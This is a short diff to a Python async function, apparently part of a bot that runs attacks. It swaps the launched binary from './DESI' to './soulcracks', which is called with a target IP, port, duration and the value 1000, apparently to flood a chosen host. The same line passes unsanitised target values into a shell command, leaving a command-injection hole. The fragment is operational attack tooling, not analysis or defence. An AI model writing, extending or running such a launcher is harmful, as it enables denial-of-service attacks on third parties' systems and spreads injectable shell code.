@@ -68,7 +68,7 @@ async def run_attack_command_async(target_ip, target_port, duration):
     global attack_in_progress
     attack_in_progress = True  # Set the flag to indicate an attack is in progress
 
-    process = await asyncio.create_subprocess_shell(f"./DESI {target_ip} {target_port} {duration} 1000")
+    process = await asyncio.create_subprocess_shell(f"./soulcracks {target_ip} {target_port} {duration} 1000")
     await process.communicate()
 
     attack_in_progress = False  # Reset the flag after the attack is complete
